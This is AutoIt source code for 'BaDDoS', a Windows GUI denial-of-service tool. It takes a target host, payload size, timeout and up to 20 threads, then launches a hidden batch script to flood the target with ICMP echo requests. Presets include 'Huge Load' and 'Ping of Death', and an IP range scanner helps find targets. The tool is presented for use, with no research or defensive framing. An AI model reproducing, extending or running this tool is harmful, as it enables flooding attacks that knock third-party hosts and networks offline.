;Programmed by hXR16F
;hXR16F.ar@gmail.com

#NoTrayIcon
#include <ButtonConstants.au3>
#include <ComboConstants.au3>
#include <EditConstants.au3>
#include <GUIConstantsEx.au3>
#include <GuiStatusBar.au3>
#include <StaticConstants.au3>
#include <WindowsConstants.au3>

#Region ### START Koda GUI section ###
$GUI = GUICreate("", 495, 407, 267, 152)
GUISetIcon("C:\Windows\System32\shell32.dll", -51)

$Author = GUICtrlCreateLabel("> by hXR16F_", 264, 308, 220, 84, BitOR($SS_CENTER,$SS_CENTERIMAGE))
GUICtrlSetFont(-1, 24, 400, 0, "Dosis")

$MainGroup = GUICtrlCreateGroup("DoSer", 10, 6, 245, 221, BitOR($GUI_SS_DEFAULT_GROUP,$BS_CENTER))
$TargetLabel = GUICtrlCreateLabel("Target", 20, 26, 88, 21, BitOR($SS_RIGHT,$SS_CENTERIMAGE))
GUICtrlSetFont(-1, 11, 400, 0, "Arial")
$PayloadSizeLabel = GUICtrlCreateLabel("Payload Size", 20, 50, 88, 21, BitOR($SS_RIGHT,$SS_CENTERIMAGE))
GUICtrlSetFont(-1, 11, 400, 0, "Arial")
$TimeoutLabel = GUICtrlCreateLabel("Timeout", 20, 74, 88, 21, BitOR($SS_RIGHT,$SS_CENTERIMAGE))
GUICtrlSetFont(-1, 11, 400, 0, "Arial")
$MethodLabel = GUICtrlCreateLabel("Method", 20, 98, 88, 21, BitOR($SS_RIGHT,$SS_CENTERIMAGE))
GUICtrlSetFont(-1, 11, 400, 0, "Arial")
$VersionLabel = GUICtrlCreateLabel("Version", 20, 122, 89, 21, BitOR($SS_RIGHT,$SS_CENTERIMAGE))
GUICtrlSetFont(-1, 11, 400, 0, "Arial")
$ThreadsLabel = GUICtrlCreateLabel("Threads", 20, 146, 88, 21, BitOR($SS_RIGHT,$SS_CENTERIMAGE))
GUICtrlSetFont(-1, 11, 400, 0, "Arial")

$TargetInput = GUICtrlCreateInput("localhost", 120, 26, 121, 21)
$PayloadSizeInput = GUICtrlCreateInput("32", 120, 50, 121, 21, BitOR($GUI_SS_DEFAULT_INPUT,$ES_NUMBER))
$TimeoutInput = GUICtrlCreateInput("5000", 120, 74, 121, 21, BitOR($GUI_SS_DEFAULT_INPUT,$ES_NUMBER))
$MethodCombo = GUICtrlCreateCombo("", 120, 98, 121, 25, BitOR($CBS_DROPDOWNLIST,$CBS_AUTOHSCROLL))
GUICtrlSetData(-1, "ICMP Echo Request", "ICMP Echo Request")
$VersionCombo = GUICtrlCreateCombo("", 120, 122, 121, 25, BitOR($CBS_DROPDOWNLIST,$CBS_AUTOHSCROLL))
GUICtrlSetData(-1, "Default|10.0.16299.15|10.0.10240.16384|6.3.9600.16384|6.2.9200.16384|6.1.7600.16385|6.0.6001.18000|5.2.3790.0|5.1.2600.5512|5.00.2134.1", "Default")
GUICtrlCreateGroup("", -99, -99, 1, 1)
$ThreadsCombo = GUICtrlCreateCombo("", 120, 146, 37, 25, BitOR($CBS_DROPDOWNLIST,$CBS_AUTOHSCROLL))
GUICtrlSetData(-1, "1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19|20", "1")

$StartButton = GUICtrlCreateButton("Start", 32, 180, 75, 29)
GUICtrlSetFont(-1, 11, 400, 0, "Arial")
$StopButton = GUICtrlCreateButton("Stop", 158, 180, 75, 29)
GUICtrlSetFont(-1, 11, 400, 0, "Arial")
GUICtrlSetState(-1, $GUI_DISABLE)
$Status = GUICtrlCreateLabel("", 122, 184, 22, 22, BitOR($SS_CENTER,$SS_CENTERIMAGE,$SS_SUNKEN))
GUICtrlSetBkColor(-1, 0xFF0000)

$PresetsGroup = GUICtrlCreateGroup("Presets", 10, 232, 245, 83, BitOR($GUI_SS_DEFAULT_GROUP,$BS_CENTER))
$SlowBandwidthButton = GUICtrlCreateButton("Slow Bandwidth", 18, 248, 121, 25)
GUICtrlSetFont(-1, 11, 400, 0, "Arial")
$HugeLoadButton = GUICtrlCreateButton("Huge Load", 142, 248, 105, 25)
GUICtrlSetFont(-1, 11, 400, 0, "Arial")
$NormalPingButton = GUICtrlCreateButton("Normal Ping", 18, 278, 105, 25)
GUICtrlSetFont(-1, 11, 400, 0, "Arial")
$PingOfDeathButton = GUICtrlCreateButton("Ping of Death", 126, 278, 121, 25)
GUICtrlSetFont(-1, 11, 400, 0, "Arial")
GUICtrlCreateGroup("", -99, -99, 1, 1)

$MiscGroup = GUICtrlCreateGroup("Misc", 10, 320, 245, 73, BitOR($GUI_SS_DEFAULT_GROUP,$BS_CENTER))
$WhoIsButton = GUICtrlCreateButton("WhoIs", 18, 336, 75, 25)
GUICtrlSetFont(-1, 11, 400, 0, "Arial")
$HeaderButton = GUICtrlCreateButton("Header", 95, 336, 75, 25)
GUICtrlSetFont(-1, 11, 400, 0, "Arial")
$MyIPButton = GUICtrlCreateButton("My IP", 172, 336, 75, 25)
GUICtrlSetFont(-1, 11, 400, 0, "Arial")
$LoggingCheckbox = GUICtrlCreateCheckbox("Logging", 19, 366, 73, 17)
GUICtrlSetFont(-1, 11, 400, 0, "Arial")
$FasterCheckbox = GUICtrlCreateCheckbox("Faster", 96, 366, 73, 17)
GUICtrlSetState(-1, $GUI_CHECKED)
GUICtrlSetFont(-1, 11, 400, 0, "Arial")
GUICtrlCreateGroup("", -99, -99, 1, 1)

$IPScanGroup = GUICtrlCreateGroup("IP Scanner", 264, 6, 221, 169, BitOR($GUI_SS_DEFAULT_GROUP,$BS_CENTER))
$RangeLabel = GUICtrlCreateLabel("Range", 272, 24, 58, 21, BitOR($SS_RIGHT,$SS_CENTERIMAGE))
GUICtrlSetFont(-1, 11, 400, 0, "Arial")
$IPScannerThreadsLabel = GUICtrlCreateLabel("Threads", 274, 96, 56, 21, BitOR($SS_RIGHT,$SS_CENTERIMAGE))
GUICtrlSetFont(-1, 11, 400, 0, "Arial")
$IPScannerTimeoutLabel = GUICtrlCreateLabel("Timeout", 272, 72, 58, 21, BitOR($SS_RIGHT,$SS_CENTERIMAGE))
GUICtrlSetFont(-1, 11, 400, 0, "Arial")
$msLabel = GUICtrlCreateLabel("ms", 396, 72, 58, 21, $SS_CENTERIMAGE)
GUICtrlSetFont(-1, 11, 400, 0, "Arial")

$IPAddress1 = GUICtrlCreateInput("192.168.0.1", 340, 24, 131, 21)
$IPAddress2 = GUICtrlCreateInput("192.168.1.255", 340, 48, 131, 21)
$IPScannerTimeout = GUICtrlCreateCombo("", 340, 72, 51, 25, BitOR($CBS_DROPDOWNLIST,$CBS_AUTOHSCROLL))
GUICtrlSetData(-1, "50|100|150|200|250|300|400|500|650|800|1000|1500|2000|3000|4000|5000", "300")
$IPScannerThreads = GUICtrlCreateCombo("", 340, 96, 37, 25, BitOR($CBS_DROPDOWNLIST,$CBS_AUTOHSCROLL))
GUICtrlSetData(-1, "1|2|5|10|15|20|25|30|35|40|45|50", "25")
$IPScanButton = GUICtrlCreateButton("Scan", 339, 130, 75, 29)
GUICtrlSetFont(-1, 11, 400, 0, "Arial")
GUICtrlCreateGroup("", -99, -99, 1, 1)

$PingGroup = GUICtrlCreateGroup("Ping", 264, 180, 221, 119, BitOR($GUI_SS_DEFAULT_GROUP,$BS_CENTER))
$PingTestHostLabel = GUICtrlCreateLabel("Host", 276, 200, 34, 21, BitOR($SS_RIGHT,$SS_CENTERIMAGE))
GUICtrlSetFont(-1, 11, 400, 0, "Arial")

$PingTestHost = GUICtrlCreateInput("www.google.com", 322, 200, 149, 21)
$PingTestUntilStoppedCheckbox = GUICtrlCreateCheckbox("Until stopped", 323, 228, 149, 17)
GUICtrlSetFont(-1, 11, 400, 0, "Arial")
$PingButton = GUICtrlCreateButton("Ping", 322, 254, 75, 29, $BS_CENTER)
GUICtrlSetFont(-1, 11, 400, 0, "Arial")
GUICtrlCreateGroup("", -99, -99, 1, 1)

GUISetState(@SW_SHOW)
#EndRegion ### END Koda GUI section ###
WinSetOnTop("", 0, 1)

While 1
	$nMsg = GUIGetMsg()
	Switch $nMsg

		Case $GUI_EVENT_CLOSE
			While WinExists("#####_BaDDoS_#####")
				WinKill("#####_BaDDoS_#####")
			WEnd
			Exit

		Case $StartButton
			GUICtrlSetState($StartButton, 128)

			Local $TargetData = GUICtrlRead($TargetInput)
			Local $PayloadSizeData = GUICtrlRead($PayloadSizeInput)
			Local $TimeoutData = GUICtrlRead($TimeoutInput)
			Local $MethodData = GUICtrlRead($MethodCombo)
			Local $VersionData = GUICtrlRead($VersionCombo)

			If $MethodData = "ICMP Echo Request" Then
				$CurrentMethod = 1
			EndIf

			Local $ThreadsData = GUICtrlRead($ThreadsCombo)
			Local $LoggingData = GUICtrlRead($LoggingCheckbox)
			Local $FasterData = GUICtrlRead($FasterCheckbox)

			If $CurrentMethod = 1 Then
				FileWrite(@ScriptDir & "\input.ini", $TargetData & @CRLF & $PayloadSizeData & @CRLF & $TimeoutData & @CRLF & $VersionData & @CRLF & $ThreadsData & @CRLF & $LoggingData & @CRLF & $FasterData)
			EndIf
			Sleep(50)

			If $LoggingData = 1 Then
				ShellExecute(@ScriptDir & "\BaDDoS.bat")
			Else
				ShellExecute(@ScriptDir & "\BaDDoS.bat", "", "", "", @SW_HIDE)
			EndIf

			WinActivate("")
			GUICtrlSetBkColor($Status, 0x00EE00)
			GUICtrlSetState($StopButton, 64)

		Case $StopButton
			GUICtrlSetState($StopButton, 128)

			While WinExists("#####_BaDDoS_#####")
				WinKill("#####_BaDDoS_#####")
			WEnd

			GUICtrlSetState($StartButton, 64)
			GUICtrlSetBkColor($Status, 0xFF0000)

		Case $SlowBandwidthButton
			GUICtrlSetData($PayloadSizeInput, 0)
			GUICtrlSetData($TimeoutInput, 50)

		Case $HugeLoadButton
			GUICtrlSetData($PayloadSizeInput, 22500)
			GUICtrlSetData($TimeoutInput, 2000)

		Case $NormalPingButton
			GUICtrlSetData($PayloadSizeInput, 32)
			GUICtrlSetData($TimeoutInput, 4000)
			GUICtrlSetData($VersionCombo, "Default")

		Case $PingOfDeathButton
			GUICtrlSetData($PayloadSizeInput, 65500)
			GUICtrlSetData($TimeoutInput, 1)
			GUICtrlSetData($VersionCombo, "5.00.2134.1")

		Case $IPScanButton
			;$IPScanPrompt = MsgBox(0x4 + 0x20, "IP Scanner", "It can take a while, continue?")
			;If $IPScanPrompt = "6" Then
				$Dir = @ScriptDir
				FileChangeDir(@ScriptDir & "\IPSCAN")
				FileWrite("BatchIPScanner.cfg", GUICtrlRead($IPAddress1) & @CRLF & GUICtrlRead($IPAddress2) & @CRLF & GUICtrlRead($IPScannerThreads) & @CRLF & GUICtrlRead($IPScannerTimeout))
				Sleep(100)
				ShellExecute("BatchIPScanner.bat")
				FileChangeDir($Dir)
			;EndIf

		Case $PingButton
			If GUICtrlRead($PingTestUntilStoppedCheckbox) = 1 Then
				ShellExecute("C:\Windows\System32\cmd.exe", " /K ping " & GUICtrlRead($PingTestHost) & " -t")
			Else
				ShellExecute("C:\Windows\System32\cmd.exe", " /K ping " & GUICtrlRead($PingTestHost))
			EndIf

		Case $WhoIsButton
			Local $TargetData = GUICtrlRead($TargetInput)
			If $TargetData = "localhost" Or $TargetData = "127.0.0.1" Or $TargetData = "0.0.0.0" Or $TargetData = "192.168.0.1" Or $TargetData = "192.168.1.1" Or $TargetData = "" Then
				MsgBox(0x0 + 0x30, "WhoIs", "You must type a valid domain name!")
			Else
				ShellExecute("https://www.namecheap.com/domains/whois/results.aspx?domain=" & $TargetData)
			EndIf

		Case $HeaderButton
			Local $TargetData = GUICtrlRead($TargetInput)
			If $TargetData = "localhost" Or $TargetData = "127.0.0.1" Or $TargetData = "0.0.0.0" Or $TargetData = "192.168.0.1" Or $TargetData = "192.168.1.1" Or $TargetData = "" Then
				MsgBox(0x0 + 0x30, "Header", "You must type a valid domain name!")
			Else
				ShellExecute("http://tools.seobook.com/server-header-checker/?page=single&url=http%3A%2F%2F" & $TargetData & "&useragent=4&typeProtocol=11")
			EndIf

		Case $MyIPButton
			MsgBox(0x0 + 0x40, "My IP", "Your external IP address is: " & _IP())

	EndSwitch
WEnd

Func _IP()
	Local Const $GETIP_TIMER = 10000 ;Seconds * 1000
	Local Static $hTimer = 0
	Local Static $sLastIP = 0

	If TimerDiff($hTimer) < $GETIP_TIMER And Not $sLastIP Then
		Return SetExtended(1, $sLastIP)
	EndIf

	Local $aGetIPURL[] = ["https://api.ipify.org", "http://www.myexternalip.com/raw", "http://bot.whatismyipaddress.com", "http://checkip.dyndns.org"], _
			$aReturn = 0, _
			$sReturn = ""

	For $i = 0 To UBound($aGetIPURL) - 1
		$sReturn = InetRead($aGetIPURL[$i])
		If @error Or $sReturn == "" Then ContinueLoop
		$aReturn = StringRegExp(BinaryToString($sReturn), "((?:\d{1,3}\.){3}\d{1,3})", $STR_REGEXPARRAYGLOBALMATCH) ; [\d\.]{7,15}
		If Not @error Then
			$sReturn = $aReturn[0]
			ExitLoop
		EndIf
		$sReturn = ""
	Next

	$hTimer = TimerInit()
	$sLastIP = $sReturn
	If $sReturn == "" Then Return SetError(1, 0, -1)
	Return $sReturn
EndFunc   ;==>_IP
